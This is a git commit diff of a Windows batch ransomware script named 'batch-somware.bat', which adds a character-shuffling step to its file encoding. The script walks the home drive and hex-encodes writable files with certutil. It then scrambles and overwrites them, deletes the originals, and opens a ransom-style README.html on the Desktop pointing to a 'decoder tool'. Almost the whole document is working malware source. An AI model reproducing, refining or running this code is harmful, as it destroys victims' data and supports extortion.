3f7b5ad14e17be48ef2a4d8b8e7c01adeb909a1c
MarkTauber <96663117+MarkTauber@users.noreply.github.com>
2023-12-11 22:38:02 +0300

    Add files via upload
    Added shuffling of encoded strings

--- batch-somware.bat
+++ batch-somware.bat
@@ -1,7 +1,9 @@
 @echo off
-setlocal enabledelayedexpansion
+setlocal enableextensions enabledelayedexpansion
 set /a cnt=0
 set "fileExtension=*.ext1 *.ext2 *.ext3"
+
+rem "Stealth" startup
 IF EXIST "tmp" (del /F /Q tmp  >nul	
 	goto x
 ) ELSE ( ECHO test > tmp
@@ -9,6 +11,8 @@ IF EXIST "tmp" (del /F /Q tmp  >nul
 	exit
 )
 :x
+
+rem searching in homedrive 
 for /r "%homedrive%\" %%i in (*%fileExtension%) do ( set "filePath=%%i"
     set "filePath=!filePath:\=!"
     if /i not "!filePath:windows=!"=="!filePath!" ( echo Skipping Windows directory: !filePath!
@@ -18,28 +22,55 @@ for /r "%homedrive%\" %%i in (*%fileExtension%) do ( set "filePath=%%i"
 		for %%f in ("%%i") do set "fileSize=%%~Zf" >nul
 		if !fileSize! equ 0 ( echo skip:       %%i 
 		) else ( icacls %filename% | findstr /R ("%username%".*F)
-		rem параметр /C не работает, но я оставлю
+		rem the /C option doesn't work
 		if %errorlevel% equ 0 (
-			rem certutil -f -encode "%%i" "%%i" >nul - более простая версия, сейчас двойная
-			certutil -f -encodehex "%%i" "%%i" 0xC >nul 
+			rem the alternative is ("%username%".*M) instead of ("%username%".*F) 
+			rem certutil -f -encodehex "%%i" "%%i" 0xC >nul 
 			certutil -f -encodehex "%%i" "%%i" 1 >nul 
-			rem certutil -f -encode "%%i" "%%i.brsm" >nul
-			rem echo "%%i.brsm"
-			rem del /F /Q  "%%i" >nul	
+			call :code "%%i"
+			rem echo done2
+			
 			set /a cnt+=1
-			rem альтернатива - перезапись файла, требуется ("%username%".*M) вместо ("%username%".*F) на 20-й строке 
-			rem copy /Y "%%i.brsm" "%%i"
-			rem del /F /Q "%%i.brsm"
 		) else ( echo no access to "%%i" )
 		)
     )
 )
+rem message AV alerts here
 if %cnt% NEQ 0 ( echo %cnt% files have been encrypted, starting message
 	echo ^<html^>^<head^>^<title^>RSM.MSG^</title^> ^<style^> #texto2{padding-top: 2%; letter-spacing: 2px; text-align: center;}^</style^>^</head^> > "%userprofile%\Desktop\README.html"
 	echo ^<body bgcolor="#FF3333" scroll="no"^> ^<font face="Lucida Console" size="4" color="white"^> ^<br^>^<br^>^<br^> >> "%userprofile%\Desktop\README.html"
 	echo ^<center^>^<p^> - easy batch-somware - ^</p^>^</center^> ^<div id="texto2"^> ^<img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100"^> >> "%userprofile%\Desktop\README.html"
 	echo ^<br^>^<br^>^<br^> Oh, my. It looks like %cnt% of your files were encrypted!^<br^>^<br^>^<br^> >> "%userprofile%\Desktop\README.html"
-	echo Not cool, but you can restore your %fileExtension% files using "certutil". ^<br^>^<br^> Be careful next time! ^</body^>^</html^> >> "%userprofile%\Desktop\README.html"
+	echo Not cool, but you can restore your %fileExtension% using decoder tool ^</body^>^</html^> >> "%userprofile%\Desktop\README.html"
 	start "" "%userprofile%\Desktop\README.html"
 ) else (  echo no files have been encrypted, exiting )
-pause >nul
+rem pause >nul
+
+
+:code
+set "INTEXTFILE=%1"
+set "OUTTEXTFILE=tmp.out"
+for /f "delims=" %%A in ('type %INTEXTFILE%') do (
+    rem set "string=%%A"
+	echo %%A
+	call :shuffle %%A "%~nx1"
+)
+del /F /Q %INTEXTFILE%
+rename "%OUTTEXTFILE%" "%~nx1"
+echo done
+exit /b
+
+:shuffle
+set str="%1"
+for %%a in (%str%) do set str=%%~a
+set newstr=
+:Loop
+set "first=%str:~0,1%"
+set "fourth=%str:~3,1%"
+set "str=%str:~1,2%%str:~4%"
+set "newstr=%newstr%%first%%fourth%"
+if not "%fourth%"=="" goto Loop
+set "newstr=%newstr%%str:~1%%str:~0,1%
+echo %newstr%
+echo %newstr% >> "%OUTTEXTFILE%"
+goto :eof
